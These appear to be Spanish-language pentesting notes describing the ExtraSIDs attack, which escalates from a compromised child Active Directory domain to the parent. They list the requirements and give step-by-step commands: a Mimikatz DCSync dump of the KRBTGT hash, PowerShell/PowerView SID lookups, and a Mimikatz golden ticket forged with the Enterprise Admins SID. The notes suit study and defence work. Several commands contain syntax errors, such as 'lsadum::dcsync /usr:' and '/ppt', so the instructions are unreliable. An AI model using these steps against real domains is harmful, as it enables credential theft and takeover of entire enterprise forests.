
>Una confianza de dominio se utiliza para establecer la autenticación entre bosques o dominios.
>Este caso se da cuando una empresa por ejemplo tiene dos dominios diferentes y los fusionan, pudiendo los usuarios poder acceder a ambos dominios

# Child -> Parent
## SID History
>El SID-History es diseñado para almacenar SID, a lo cual le permite a un usuario del bosque1 que ha sido añadido en el bosque2 poder acceder a los recursos sobre los que tiene permiso de los dos sin problema

### EXTRASID Attack
Este ataque permite comprometer un dominio `principal(parent)` una vez comprometido un dominio `secundario(child)`

## Requisitos
- Hash KRBTGT -> del dominio secundario(child)
- SID -> del dominio secundario(child)
- Nombre del usuario objetivo en el domingo secundario (No tiene por que existir)
- FQDN -> del dominio secundario(child)
- SID -> del grupo de Administradores del dominio principal(parent)


## Fases

**Todas las fases enumeradas a continuación se harán desde la maquina comprometida del dominio secundario(child)**
### Obtención del hash de la cuenta KRBTGT
Una vez hemos obtenido el control total en el dominio secundario(child) deberemos obtener el `HASH KRBTGT` usando [[MIMIKATZ]]
Ejecutamos [[MIMIKATZ]] y lanzamos el comando

```shell
lsadum::dcsync /usr:<domain>\krbtgt
```

Obteniendo así el hash

### Obtener el SID del dominio secundario(child)
Usaremos el comando
```shell
Get-DomainSID
```

Obteniendo el `SID` del dominio secundario(child)

### Obtener SID del grupo de administradores del dominio principal(parent)
Para obtener este `SID` se puede hacer de dos formas
- Desde `cmdlet` 

```shell
Get-ADGroup -Identity "Enterprise Admins" -Server "<Dominio.Principal>"
```

- Usando [[POWERVIEW]]

```shell
Get-DomainGroup -Domain <Dominio.Principal> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

### Explotacion -> MIMIKATZ
Podemos realizar la explotación después de obtener toda la información usando [[MIMIKATZ]]
Creando primero el `GOLDEN TICKET`

```shell
kerberos:golden /user:hacker/<Dominio.Principal> /domain:<Dominio.Principal> /sid:<SID.Secundario> /krbtgt:<hash> /sids:<SID.Principal> /ppt
```

